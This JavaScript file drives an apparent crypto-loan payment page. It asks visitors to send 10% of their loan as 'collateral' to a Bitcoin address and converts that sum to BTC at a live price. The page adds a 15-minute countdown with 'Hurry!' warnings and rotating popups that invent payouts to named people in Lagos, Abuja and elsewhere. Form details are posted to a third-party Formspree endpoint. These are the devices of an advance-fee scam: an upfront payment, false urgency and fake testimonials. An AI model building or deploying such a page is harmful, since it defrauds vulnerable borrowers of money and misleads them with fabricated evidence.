// ---------------- COPY BTC ADDRESS ----------------
function copyAddress() {
  const address = document.getElementById("btcAddress").innerText;
  navigator.clipboard.writeText(address).then(() => {
    const status = document.querySelector(".status");
    status.innerText = "✅ Address copied! Proceed with payment.";
    status.style.color = "#4caf50";
    // subtle fade effect
    status.style.opacity = 0;
    setTimeout(() => { status.style.opacity = 1; }, 100);
  }).catch(() => {
    alert("Failed to copy. Please copy manually.");
  });
}

// ---------------- LOAD USER DATA ----------------
const name = localStorage.getItem("name") || "User";
const email = localStorage.getItem("email") || "user@example.com";
const loanAmount = parseFloat(localStorage.getItem("loanAmount")) || 0;

// DOM elements
const pName = document.getElementById("pName");
const pEmail = document.getElementById("pEmail");
const pLoan = document.getElementById("pLoan");
const pCollateral = document.getElementById("pCollateral");
const pBTC = document.getElementById("pBTC");

// Display user info
pName.innerText = name;
pEmail.innerText = email;
pLoan.innerText = loanAmount.toFixed(2);

const collateralUSD = loanAmount * 0.10;
pCollateral.innerText = collateralUSD.toFixed(2);

// ---------------- FETCH BTC PRICE ----------------
async function loadBTC() {
  try {
    const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd");
    const data = await res.json();
    const btcPrice = data.bitcoin.usd;
    const btcAmount = collateralUSD / btcPrice;
    pBTC.innerText = btcAmount.toFixed(6);
  } catch (err) {
    pBTC.innerText = "Error loading price";
    console.error(err);
  }
}
loadBTC();

// ---------------- COUNTDOWN TIMER ----------------
let time = 15 * 60; // 15 minutes in seconds
const timerEl = document.getElementById("timer");
const statusEl = document.querySelector(".status");

function updateTimer() {
  const minutes = Math.floor(time / 60);
  const seconds = time % 60;
  timerEl.innerText = `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`;

  if (time <= 0) {
    timerEl.innerText = "EXPIRED";
    statusEl.innerText = "⚠️ Time expired. Refresh page to retry.";
    statusEl.style.color = "#ff4d4d";
    clearInterval(countdownInterval);
  } else if (time <= 60) {
    statusEl.innerText = "⏰ Hurry! Less than 1 min remaining.";
    statusEl.style.color = "#ffb347";
  }
  time--;
}

const countdownInterval = setInterval(updateTimer, 1000);

// ---------------- LIVE POPUP ----------------
const liveMessages = [
  "David from Lagos just received 0.02 BTC 💰",
  "Sarah from Abuja just completed payment ✅",
  "Michael from Accra just received 0.015 BTC 🚀",
  "John from Nairobi just applied for a loan 📄",
  "Cloe from USA just received 0.05 BTC 💸",
  "Emeka from Lagos just completed collateral payment 🔥"
];

function showLivePopup() {
  const box = document.getElementById("liveBox");
  const text = document.getElementById("liveText");

  const randomMsg = liveMessages[Math.floor(Math.random() * liveMessages.length)];
  text.innerText = randomMsg;

  box.classList.add("show");

  setTimeout(() => {
    box.classList.remove("show");
  }, 4000);
}

setInterval(showLivePopup, 8000);

// ---------------- RESPONSIVE ADJUSTMENT ----------------
window.addEventListener("resize", () => {
  const qr = document.querySelector(".qr img");
  if (window.innerWidth < 400) qr.style.width = "180px";
  else qr.style.width = "220px";
});

    document.getElementById("paymentForm").addEventListener("submit", function(e){

e.preventDefault();

fetch("https://formspree.io/f/xyknzblq", {
method: "POST",
body: new FormData(this),
headers: {
'Accept': 'application/json'
}
}).then(() => {

window.location.href = "dashboard.html";

});

});
